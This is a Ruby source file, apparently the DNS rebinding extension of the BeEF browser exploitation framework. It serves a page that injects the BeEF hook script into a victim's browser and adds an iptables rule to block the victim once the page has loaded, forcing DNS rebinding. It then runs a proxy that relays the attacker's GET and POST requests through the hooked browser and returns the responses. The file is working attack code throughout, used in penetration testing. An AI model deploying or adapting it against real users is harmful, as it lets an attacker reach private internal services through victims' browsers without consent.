module BeEF
module Extension
module DNSRebinding
    #Very simple HTTP server. Its task is only hook victim
    class Server
        @debug_mode = false
        def self.log(msg)
            if @debug_mode
                STDERR.puts msg.to_s
            end
        end

        def self.run_server(address, port)
            server = TCPServer.new(address, port)
            @debug_mode = BeEF::Core::Configuration.instance.get("beef.extension.dns_rebinding.debug_mode")
            loop do
                s = server.accept
                Thread.new(s) do |socket|
                    victim_ip = socket.peeraddr[2].to_s

                    log "-------------------------------\n"
                    log "[Server] Incoming request from "+victim_ip+"(Victim)\n"

                    response  = File.read(File.expand_path('../views/index.html', __FILE__))
                    configuration = BeEF::Core::Configuration.instance

                    proto = configuration.get("beef.http.https.enable") == true ? "https" : "http"
                    hook_file = configuration.get("beef.http.hook_file")
                    hook_uri = "#{proto}://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}#{hook_file}"
                    
                    response.sub!('path_to_hookjs_template', hook_uri)

                    start_string = socket.gets
                    socket.print "HTTP/1.1 200 OK\r\n" +
                                 "Content-Type: text/html\r\n" +
                                 "Content-Length: #{response.bytesize}\r\n" +
                                 "Connection: close\r\n"
                    socket.print "\r\n"
                    socket.print response
                    socket.close

                    #Indicate that victim load all javascript and we can block it with iptables.
                    dr_config = configuration.get("beef.extension.dns_rebinding")
                    if start_string.include?("load")
                        log "[Server] Block with iptables\n"
                        port_http = dr_config['port_http']
                        if BeEF::Filters::is_valid_ip?(victim_ip) && port_http.kind_of?(Integer)
                            IO.popen(["iptables","-A","INPUT","-s","#{victim_ip}","-p","tcp","--dport","#{port_http}","-j","REJECT","--reject-with","tcp-reset"], 'r+'){|io|}
                        else
                          print_error "[Dns_Rebinding] victim_ip or port_http values are illegal."
                        end
                    end
                    log "-------------------------------\n"
                end
            end
    	end
    end

    class Proxy
        @queries = Queue.new
        @responses = {}
        @mutex_responses = nil
        @mutex_queries = nil
        @debug_mode = false

        def self.send_http_response(socket, response, heads={})
            socket.print "HTTP/1.1 200 OK\r\n"

            headers = {}
            headers["Content-Type"]="text/html"
            headers["Content-Length"]=response.size.to_s
            headers["Connection"]="close"
            headers["Access-Control-Allow-Origin"]="*"
            headers["Access-Control-Allow-Methods"]="POST, GET, OPTIONS"
            headers["Access-Control-Expose-Headers"]="Content-Type, method, path"
            headers["Access-Control-Allow-Headers"]="Content-Type, method, path"

            headers_a = heads.to_a
            headers_a.each do |header, value|
                headers[header] = value
            end

            headers.to_a.each do |header, value|
                socket.print header+": "+value+"\r\n"
            end

            socket.print "\r\n"
            socket.print response
        end

        def self.log(log_message)
            if @debug_mode
                STDERR.puts log_message
            end
        end

        def self.read_http_message(socket)
            message = {}
            message['start_string'] = socket.gets.chomp
            message['headers'] = {}
            message['response'] = ""
            c = socket.gets
            while c != "\r\n" do
                name = c[/(.+): (.+)/, 1]
                value = c[/(.+): (.+)/, 2]
                message['headers'][name] = value.chomp
                c = socket.gets
            end
            length = message['headers']['Content-Length']
            if length
                #Ruby read() doesn't return while not read all <length> byte
                resp = socket.read(length.to_i)
                message['response'] = resp
            end
            return message
        end

        def self.handle_victim(socket, http_message)
            log "[Victim]request from victim\n"
            log http_message['start_string'].to_s+"\n"

            if http_message['start_string'].include?("POST")
                #Get result from POST query
                log "[Victim]Get the result of last query\n"

                #Read query on which asked victim
                query = http_message['start_string'][/path=([^HTTP]+)/,1][0..-2]
                log "[Victim]asked path: "+query+"\n"

                length = http_message['headers']['Content-Length'].to_i
                content_type = http_message['headers']['Content-Type']
                log "[Victim]Content-type: "+content_type.to_s+"\n"
                log "[Vicitm]Length: "+length.to_s+"\n" 
                
                response = http_message['response']
                log "[Victim]Get content!\n"

                send_http_response(socket, "ok")
                socket.close

                log "[Victim]Close connection POST\n"
                log "--------------------------------\n"

                @mutex_responses.lock
                @responses[query] = [content_type, response]
                @mutex_responses.unlock
            elsif http_message['start_string'].include?("OPTIONS")
                send_http_response(socket, "")
                socket.close
                log "[Victim]Respond on OPTIONS reques\n"
                log "--------------------------------\n"
            else
                #Look for queues from beef owner
                log "[Victim]Waiting for next query..\n"
                while @queries.size == 0
                end

                #Get the last query
                @mutex_queries.lock
                log "[Victim]Get the last query\n"
                last_query = @queries.pop
                log "[Victim]Last query:"+last_query.to_s+"\n"
                @mutex_queries.unlock

                response = last_query[2]
                send_http_response(socket, response, {'method'=>last_query[0], 'path'=>last_query[1]})
                log  "[Victim]Send next query to victim's browser\n"
                log "---------------------------------------------\n"
                socket.close
            end
        end

        #Handle request from BeEF owner
        def self.handle_owner(socket, http_message)
            log "[Owner]Request from owner\n"
            path = http_message['start_string'][/(\/[^HTTP]+)/, 1][0..-2]

            if http_message['start_string'].include?("GET")
                if path != nil
                    log "[Owner]Need path: "+path+"\n"
                    @queries.push(['GET', path, ''])
                end
            elsif http_message['start_string'].include?("POST")
                log "[Owner]Get POST request\n"
                if path != nil
                    @queries.push(['POST', path, http_message['response']])
                end
            end

            #Waiting for response, this check should not conflict with thread 2
            while @responses[path] == nil
            end

            @mutex_responses.lock
            log "[Owner]Get the response\n"
            response_a = @responses[path]
            @mutex_responses.unlock

            response = response_a[1]
            content_type = response_a[0]

            send_http_response(socket, response, {'Content-Type'=>content_type})

            log "[Owner]Send response to owner\n"
            log "-------------------------------\n"
            socket.close
        end

        def self.run_server(address, port)
            @server = TCPServer.new(address, port)
            @mutex_responses = Mutex.new
            @mutex_queries = Mutex.new
            @debug_mode = BeEF::Core::Configuration.instance.get("beef.extension.dns_rebinding.debug_mode")
            loop do
                s = @server.accept
                Thread.new(s) do |socket|
                    http_message = read_http_message(socket)
                    if http_message['start_string'].include?("from_victim")
                        handle_victim(socket, http_message)
                    else
                        handle_owner(socket, http_message)
                    end
                end
            end
        end
    end

end
end
end
